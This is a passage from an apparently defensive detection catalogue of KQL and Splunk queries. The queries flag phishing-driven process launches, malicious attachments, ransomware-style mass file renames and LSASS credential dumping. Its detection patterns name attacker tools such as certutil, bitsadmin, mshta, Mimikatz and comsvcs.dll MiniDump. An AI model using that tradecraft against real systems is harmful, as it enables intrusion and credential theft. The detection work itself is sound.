          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user

     | rename dest AS src]

| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count
    from datamodel=Email.All_Email
    where All_Email.file_name!="-"
    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject
| rename All_Email.recipient as user
| join type=inner user
    [| tstats `summariesonly` count
        from datamodel=Endpoint.Processes
        where Processes.parent_process_name IN ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]
| tstats summariesonly=false count
    from datamodel=Email.All_Email
    where All_Email.file_name!="-"
    by All_Email.src_user, All_Email.recipient, All_Email.file_name, All_Email.subject
| rename All_Email.recipient as user
| join type=inner user
    [| tstats summariesonly=false count
        from datamodel=Endpoint.Processes
        where Processes.parent_process_name IN ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
          AND Processes.process_name IN ("cmd.exe","powershell.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe")
        by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
     | rename Processes.user as user]

Ransomware-style mass file rename / extension change Actions on Objectives Medium
Threshold detection: many files renamed in short window, often with new extension.
ATT&CKT1486
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(1d)
| where InitiatingProcessAccountName !endswith "$"
| where ActionType in ("FileRenamed","FileModified")
| summarize files = dcount(FileName) by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 1m)
| where files > 200    // empirical: > 200 unique-file renames in 1m by one account on one host
                       //            is well above the P99 of legitimate bulk-tooling
| order by files desc

ImFileEvent
| where TimeGenerated > ago(1d)
| where ActorUsername !endswith "$"
| where EventType in ("FileRenamed","FileModified")
| summarize files = dcount(TargetFileName)
            by DvcHostname, ActorUsername, ActingProcessName, bin(TimeGenerated, 1m)
| where files > 200    // P99 of legit bulk-tooling per-minute rename volume
| order by files desc
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem
    where Filesystem.action IN ("modified","renamed")
    by Filesystem.dest, Filesystem.user, _time span=1m
| `drop_dm_object_name(Filesystem)`
| where files > 200
| sort - files
| tstats summariesonly=false count, dc(Filesystem.file_name) AS files
    from datamodel=Endpoint.Filesystem

LSASS process access / dump (credential theft) Actions on Objectives High
Mimikatz, comsvcs.dll MiniDump, or any non-Windows process opening LSASS.
ATT&CKT1003.001 T1003
Data sourcesEndpoint.Processes DeviceEvents
DeviceEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where ActionType == "OpenProcessApiCall"
| where FileName =~ "lsass.exe"
| where InitiatingProcessFileName !in~ ("MsSense.exe","MsMpEng.exe","csrss.exe",
                                          "svchost.exe","wininit.exe","services.exe",
                                          "lsm.exe","SearchProtocolHost.exe")
| project Timestamp, DeviceName, ActionType, FileName,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, AccountName
| order by Timestamp desc
// SecurityEvent EventID 4663 = object access. AccessMask 0x10 / 0x40 / 0x1010
// indicate read access to lsass.exe — credential-dump signature. Audit
// Object Access > Audit File System policy required.
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4663
| where ObjectName endswith "\lsass.exe"
| where Account !endswith "$"
| project TimeGenerated, Computer, Account, ObjectName, ProcessName,
          AccessMask, AccessReason
| order by TimeGenerated desc
